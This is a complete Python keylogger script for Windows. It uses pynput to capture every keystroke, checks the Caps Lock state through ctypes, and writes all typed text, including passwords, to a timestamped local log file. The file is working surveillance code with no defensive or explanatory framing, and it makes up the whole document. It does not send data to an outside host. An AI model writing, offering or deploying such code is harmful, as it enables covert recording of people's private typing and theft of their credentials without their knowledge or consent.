import ctypes
import pynput.keyboard
import time

Ltime = time.strftime('%Y-%m-%d %H:%M:%S ')
Ltime2 = time.strftime('%Y-%m-%d %H.%M.%S ')
output_file = open(f'{Ltime2}key_log.txt', 'a')

output_file.write(f'{Ltime}-------- KeyLogger has successfully started --------\n'f'{Ltime}')

def caps_on():
    return ctypes.windll.user32.GetKeyState(0x14) & 0x0001

def on_press(key):
    special_keys = {
        pynput.keyboard.Key.space: ' ',
        pynput.keyboard.Key.enter: '\n',
        pynput.keyboard.Key.tab: '\t',
        pynput.keyboard.Key.backspace: ' --Backspace key was pressed-- ',
        pynput.keyboard.Key.caps_lock: '',
        pynput.keyboard.Key.left: ' --Left Key-- ',
        pynput.keyboard.Key.right: ' --Right Key--',
        pynput.keyboard.Key.up: ' --Up Key-- ',
        pynput.keyboard.Key.down: ' --Down Key-- ',
        pynput.keyboard.Key.shift: '',
        pynput.keyboard.Key.shift_r: ''
    }

    if key in special_keys:
        output_file.write(special_keys[key])

        if key == pynput.keyboard.Key.enter:
            output_file.write(Ltime)
            output_file.flush()

    else:
        try:
            if caps_on():
                output_file.write('{0}'.format(key.char.upper()))
            else:
                output_file.write('{0}'.format(key.char))
        except AttributeError:
            output_file.write('{0}'.format(key))

    output_file.flush()

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
